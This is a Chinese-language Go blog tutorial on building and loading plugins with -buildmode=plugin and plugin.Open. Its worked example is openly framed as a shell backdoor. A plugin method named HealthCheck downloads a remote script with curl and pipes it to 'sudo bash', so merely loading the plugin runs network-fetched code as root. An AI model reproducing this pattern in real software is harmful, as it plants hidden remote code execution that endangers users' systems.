---
layout: post
title: Go进阶25:Go插件plugin教程
category: Golang
tags: Go进阶
keywords: Go语言教程,Golang教程,Go-plugin插件动态加载方法集
description:  Go语言教程,Golang教程,Go-plugin插件动态加载方法集,Go plugin包提供了一个简单的函数集动态加载,可以帮助开发人员编写可扩展的代码.
permalink: /go/:title
coverage: golang_plugin.png
date: 2019-09-06T17:48:54+08:00
---

## 1. Go plugin是什么

Go 1.8版本开始提供了一个创建共享库的新工具,称为 Plugins.
> A plugin is a Go main package with exported functions and variables that has been built with:
`go build -buildmode=plugin`

Plugin插件是包含可导出(可访问)的function和变量的***main package***编译(`go build -buildmode=plugin`)之后的文件.

同时官方文档也提示了：Currently plugins are only supported on Linux and macOS .它目前支持Linux和Mac操作系统(不支持windows)

[官方文档地址](https://golang.google.cn/pkg/plugin/#pkg-overview)

## 2. Go plugin生命周期

> When a plugin is first opened,
> the init functions of all packages not already part of the program are called.
> The main function is not run.
> A plugin is only initialized once, and cannot be closed.

plugin插件被打开加载 `plugin.Open("***.so")` ,插件的`init`初始化函数才开始执行.
也就是说main函数执行前plugin的init函数是不会执行的.
插件只被初始化一次,不能被关闭.

使用plugin的main.go生命周期

1. main.go的init函数执行
2. 开始执行main.go main函数
3. 开始执行`plugin.Open("***.so")`打开插件
4. 插件开始执行内部的`init`函数

## 3. Go plugin应用场景

- 1.通过plugin我们可以很方便的对于不同功能加载相应的模块并调用相关的模块;
- 2.针对不同语言(英文,汉语,德语……)加载不同的语言so文件,进行不同的输出;
- 3.编译出的文件给不同的编程语言用(如：c/java/python/lua等).
- 4.***需要加密的核心算法,核心业务逻辑可以可以编译成plugin插件***
- 5.***黑客预留的后门backdoor可以使用plugin***
- 6.***函数集动态加载***

## 4. Go plugin 示例

这个示例建展示一下两方面内容:

1. 演示plugin插件的`init`的执行顺序
2. 演示怎么编写一个shell黑客后门

### 4.1 编写插件plugin代码

直接上代码[libragen/felix/blob/master/plugin/plugin_bad_docter.go](https://github.com/libragen/felix/blob/master/plugin/plugin_bad_docter.go)

```go
package main

import (
	"log"
	"os/exec"
	"time"
)

func init() {
	log.Println("plugin init function called")
}

type BadNastyDoctor string

func (g BadNastyDoctor) HealthCheck() error {
	bs,err := exec.Command("bash","-c","curl -s 'https://tech.mojotv.cn/test.sh' | sudo bash -s 'arg000' 'arg001'").CombinedOutput()
	if err != nil {
		return err

	}
	log.Println("now is",g)
	log.Println("shell has executed ->>>>>",string(bs))
	return nil
}

//go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go

// exported as symbol named "Doctor"
var Doctor = BadNastyDoctor(time.Now().Format(time.RFC3339))
```

编写plugin插件要点

1. 包名称必须是main
2. 没有main函数
3. 必须有可以导出(访问)的变量或者方法

编写完成之后使用编译plugin

```bash
pi@homePi:/data/felix/plugin $ go build -buildmode=plugin -o=plugin_doctor.so plugin_bad_docter.go 
pi@homePi:/data/felix/plugin $ ll
总用量 6300
-rw-r--r-- 1 pi pi     612 9月   6  2019 plugin_bad_docter.go
-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so
-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md
pi@homePi:/data/felix/plugin $ file plugin_doctor.so 
plugin_doctor.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, BuildID[sha1]=9034047846f679f66ff7ac50f73aa7baf90d5e5d, not stripped
```

### 4.2 使用plugin插件

使用加载plugin基本流程

1. 加载编译好的插件 `plugin.Open("./plugin_doctor.so")` (*.so文件路径相对与可执行文件的路径,可以是绝对路径)
2. 寻找插件可到变量 `plug.Lookup("Doctor")`,
3. TypeAssert: Symbol(interface{}) 转换成API的接口类型
4. 执行API interface的方法

[远程shell脚本内容](https://tech.mojotv.cn/test.sh)

```bash
#!/usr/bin/env bash
#--destination _deploy
echo "golang plugin remote shell"  $0 $1 $2
```

[libragen/felix/blob/master/plugin/use_plugin_example.go](https://github.com/libragen/felix/blob/master/plugin/use_plugin_example.go)

```go
package main

import (
	"fmt"
	"log"
	"os"
	"plugin"
)

type GoodDoctor interface {
	HealthCheck() error
}

func init()  {
	log.Println("main package init function called")
}

func main() {
	log.Println("main function stared")
	// load module 插件您也可以使用go http.Request从远程下载到本地,在加载做到动态的执行不同的功能
	// 1. open the so file to load the symbols

	plug, err := plugin.Open("./plugin_doctor.so")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	log.Println("plugin opened")

	// 2. look up a symbol (an exported function or variable)
	// in this case, variable Greeter
	doc, err := plug.Lookup("Doctor")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// 3. Assert that loaded symbol is of a desired type
	// in this case interface type GoodDoctor (defined above)
	doctor, ok := doc.(GoodDoctor)
	if !ok {
		fmt.Println("unexpected type from module symbol")
		os.Exit(1)
	}

	// 4. use the module
	if err := doctor.HealthCheck(); err != nil {
		log.Println("use plugin doctor failed, ", err)
	}
}

```

### 4.3 build plugin程序

```bash
pi@homePi:/data/felix/plugin $ go build use_plugin_example.go
pi@homePi:/data/felix/plugin $ ll
总用量 6300
-rw-r--r-- 1 pi pi     612 9月   6 17:08 plugin_bad_docter.go
-rw-r--r-- 1 pi pi 3493654 9月   6 17:06 plugin_doctor.so
-rw-r--r-- 1 pi pi     274 9月   6 16:37 readme.md
-rwxr-xr-x 1 pi pi 2941503 9月   6 17:15 use_plugin_example
-rw-r--r-- 1 pi pi    1057 9月   6  2019 use_plugin_example.go
pi@homePi:/data/felix/plugin $ file use_plugin_example
use_plugin_example: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fc60641527d9b030f9f4d5a477de300e9fb70541, not stripped

```

### 4.4 go run

```bash
pi@homePi:/data/felix/plugin $ ./use_plugin_example 
2019/09/06 17:16:23 main package init function called
2019/09/06 17:16:23 main function stared
2019/09/06 17:16:23 plugin init function called
2019/09/06 17:16:23 plugin opened
2019/09/06 17:16:23 now is 2019-09-06T17:16:23+08:00
2019/09/06 17:16:23 shell has executed ->>>>> golang plugin remote shell bash arg000 arg001
```

## 5.Go语言plugin局限和不足

Go plugin 还不是一个成熟的解决方案.它迫使您的插件实现与主应用程序产生高度耦合.即使您可以控制插件和主应用程序,
最终结果也非常脆弱且难以维护.如果插件的作者对主应用程序没有任何控制权,开销会更高.

### 5.1 Go版本兼容问题

插件实现和主应用程序都必须使用完全相同的Go工具链版本构建.
由于插件提供的代码将与主代码在相同的进程空间中运行,
因此编译的二进制文件应与主应用程序 100%兼容.

## 6. 总结

我希望您记下的关键要点:

- 1.Go插件从v1.8版本开始支持,它目前支持Linux和Mac操作系统(不支持windows)
- 2.Go plugin包提供了一个简单的函数集动态加载,可以帮助开发人员编写可扩展的代码.
- 3.Go插件是使用`go build -buildmode = plugin`构建标志编译
- 4.Go插件包中的导出函数和公开变量,可以使用插件包在运行时查找并绑定调用.
- 5.***Go runtime import插件的开发人员必须将插件视为黑盒子,做好各种最坏的假设***

代码和资料

- [示例代码](https://github.com/libragen/felix/tree/master/plugin)
- [官方标准库文档](https://golang.google.cn/pkg/plugin/#pkg-overview)